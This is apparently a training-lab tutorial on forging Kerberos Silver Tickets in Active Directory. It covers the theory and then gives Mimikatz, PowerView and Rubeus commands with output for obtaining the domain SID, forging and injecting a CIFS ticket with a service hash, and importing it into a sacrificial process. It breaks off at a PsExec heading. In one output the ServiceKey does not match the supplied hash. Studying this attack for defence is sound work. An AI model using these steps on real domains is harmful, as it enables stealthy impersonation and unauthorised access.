# Silver Ticket



Every machine account has an NTLM hash; this is the hash of the computer, represented as the **SYSTEM$ account**. This is the PSK (Pre-Shared Key) between the Domain and Workstation which is used to sign TGS (Ticket Granting Service) Kerberos tickets. This ticket is less powerful than the TGT (Golden Ticket), as it can only access that single machine. However, when creating a TGT, the attacker needs to approach the Domain Controller to have it generate a TGS ticket before they can access any machines. This creates a unique audit record, which doesn't stand out as malicious, but heuristics can be applied to identify if it is abnormal. When forging a TGS ticket, the attacker can bypass the Domain Controller and go straight to the target, minimizing the number of logs left behind. 


## Theory 

When a user requests a TGS ticket, they send their TGT to the Domain Controller. The Domain Controller will find out which account exposes the SPN requested by the user. Then it will **copy the user's information (the PAC) into the TGS ticket**, which it will then encrypt with the secret of the service account associated with the SPN.

Because the user does not know the secret of the service account, they cannot modify their own information in the TGS ticket. But what happens if a user compromises a service account and therefore can know its secret?

The attacker can forge a service ticket from scratch since they can create an arbitrary PAC and encrypt it with the secret stolen. Once this TGS ticket is forged, the attacker presents it to the service. The service can decrypt it because it has been encrypted with its own password, and then it will read the contents of the PAC. As the attacker has forged it, they can embed whatever information they desire, such as being a domain administrator. This forged ticket is called a **Silver Ticket**.

**To forge a Silver Ticket, an attacker requires the NTLM password's hash or keys for a service or machine account, the SID of the domain, a target host, a service name (its SPN), an arbitrary username, and group information. Silver tickets can be created for any existing or non-existing user account**. 

The ticket can be forged using **Mimikatz** or **impacket** and then get injected into memory to access a target service remotely. A Silver Ticket is a forged TGS ticket, so using one does not require communication with the Domain Controller. Any associated event logs are created on the target host. Therefore, Silver Tickets are more stealthy than Golden Tickets. 


### Windows 

Different elements are needed to forge a Silver Ticket. First, we need the domain's SID. This piece of information can be retrieved using [PowerView's](https://github.com/Jesta81/PowerSploit/blob/master/Recon/PowerView.ps1) **Get-DomainSID function**. 


### Getting the Domain SID


	> Import-Module .\PowerView.ps1
	>
	PS C:\Tools> Import-Module .\PowerView.ps1
	PS C:\Tools>
	PS C:\Tools>
	PS C:\Tools>
	PS C:\Tools> Get-DomainSID
	S-1-5-21-1870146311-1183348186-593267556
		

![Get-Domain-SID](/Silver-Ticket/images/sid.png) 


We also must have **compromised a service account (one way or another) to get its NTLM hash**. We must also **specify an SPN** because a **TGS ticket is always generated for one SPN only**. We can use **mimikatz** to forge a **Silver Ticket** when we have this information.

Let's say we compromised the **SQL01$ account**. We have its **NTLM hash**. We want to **craft a TGS ticket** to access the **SQL01 filesystem**. We'll need a **CIFS/SQL01 TGS** ticket to do so. 



## Using Mimikatz to Create a Silver Ticket



	PS C:\Tools> .\mimikatz.exe

	  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
	 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
	 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
	 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
	 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
	  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

	mimikatz # kerberos::golden /domain:inlanefreight.local /user:Administrator /sid:S-1-5-21-1870146311-1183348186-593267556 /rc4:027c6604526b7b16a22e320b76e54a5b /target:sql01.inlanefreight.local /service:cifs /ptt
	User      : Administrator
	Domain    : inlanefreight.local (INLANEFREIGHT)
	SID       : S-1-5-21-1870146311-1183348186-593267556
	User Id   : 500
	Groups Id : *513 512 520 518 519
	ServiceKey: ff955e93a130f5bb1a6565f32b7dc127 - rc4_hmac_nt
	Target    : sql01.inlanefreight.local
	Lifetime  : 1/15/2024 7:47:39 AM ; 1/12/2034 7:47:39 AM ; 1/12/2034 7:47:39 AM.
	-> Ticket : ticket.kirbi

	 * PAC generated
	 * PAC signed
	 * EncTicketPart generated
	 * EncTicketPart encrypted
	 * KrbCred generated

	Final Ticket Saved to file !
	
	
![Silver Ticket Mimikatz](/Silver-Ticket/images/Silver-Ticket-Mimikatz.png) 



As we can see on the last line, the Silver Ticket has been created and submitted for the current session. Mimikatz calls it a Golden Ticket, but it's a TGS ticket that was generated, so it is a Silver Ticket. We can double-check this using the **klist** utility. 


## Reviewing the Tickets with klist



	PS C:\> klist
	 
	Current LogonId is 0:0x75d28

	Cached Tickets: (1)

	0>     Client: Administrator @ inlanefreight.local
		   Server: cifs/sql01.inlanefreight.local @ inlanefreight.local
		   KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
		   Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
		   Start Time: 1/15/2024 8:51:15 (local)
		   End Time:   1/12/2034 8:51:15 (local)
		   Renew Time: 1/12/2034 8:51:15 (local)
		   Session Key Type: RSADSI RC4-HMAC(NT)
		   Cache Flags: 0
		   Kdc Called:


![Tickts](/Silver-Ticket/images/tickets.png) 




Now that we have a ticket to **access the SQL01 filesystem**, we can use the **dir** utility. 


## Displaying Directory Information with "dir". 

![Remote Control](/Silver-Ticket/images/dir.png) 


We can also create a **Sacrificial Process**. We will discuss about sacrifical processes more in the Pass-the-Ticket section to execute PSExec using the CIFS service. Let's **create a ticket and save it in sql01.kirbi**: 


## Create a Silver Ticket


	C:\Tools> .\mimikatz.exe "kerberos::golden /domain:inlanefreight.local /user:Administrator /sid:S-1-5-21-1870146311-1183348186-593267556 /rc4:027c6604526b7b16a22e320b76e54a5b /service:cifs /ticket:sql01.kirbi" exit
		
	User      : Administrator
	Domain    : inlanefreight.local (INLANEFREIGHT)
	SID       : S-1-5-21-1870146311-1183348186-593267556
	User Id   : 500
	Groups Id : *513 512 520 518 519
	ServiceKey: 027c6604526b7b16a22e320b76e54a5b - rc4_hmac_nt
	Service   : cifs
	Lifetime  : 1/15/2024 9:01:04 AM ; 1/12/2034 9:01:04 AM ; 1/12/2034 9:01:04 AM
	-> Ticket : sql01.kirbi

	 * PAC generated
	 * PAC signed
	 * EncTicketPart generated
	 * EncTicketPart encrypted
	 * KrbCred generated

	Final Ticket Saved to file !

	mimikatz(commandline) # exit
	Bye!
	


![Mimikatz Silver](/Silver-Ticket/images/Mimikatz-Silver.png) 



## Create a Sacrificial Process


	PS C:\Tools> .\Rubeus.exe createnetonly /program:cmd.exe /show

	   ______        _
	  (_____ \      | |
	   _____) )_   _| |__  _____ _   _  ___
	  |  __  /| | | |  _ \| ___ | | | |/___)
	  | |  \ \| |_| | |_) ) ____| |_| |___ |
	  |_|   |_|____/|____/|_____)____/(___/

	  v2.2.2


	[*] Action: Create Process (/netonly)


	[*] Using random username and password.

	[*] Showing process : True
	[*] Username        : DSX7M0UK
	[*] Domain          : I0RSB6CS
	[*] Password        : B0ZIUHGY
	[+] Process         : 'cmd.exe' successfully created with LOGON_TYPE = 9
	[+] ProcessID       : 5952
	[+] LUID            : 0x19983f


![Create Process Rubues](/Silver-Ticket/images/create-process-rubeus.png) 




This Rubeus action [createnetonly](https://github.com/GhostPack/Rubeus#createnetonly) and the flag **/show**, will open the program we specify for **/program:**, in this case, **cmd.exe**. That new window is our **sacrificial process**, as it doesn't have the creds of our current user. We will import the **sql01.kirbi ticket** we forged with mimikatz using this window as follows:



## Import the Ticket in the New cmd.exe Process 



	C:\Tools>.\Rubeus.exe ptt /ticket:sql01.kirbi

	   ______        _
	  (_____ \      | |
	   _____) )_   _| |__  _____ _   _  ___
	  |  __  /| | | |  _ \| ___ | | | |/___)
	  | |  \ \| |_| | |_) ) ____| |_| |___ |
	  |_|   |_|____/|____/|_____)____/(___/

	  v2.2.2


	[*] Action: Import Ticket
	[+] Ticket successfully imported!


![Import Ticket](/Silver-Ticket/images/Import-Ticket.png) 



## Using the New cmd.exe with PsExec 

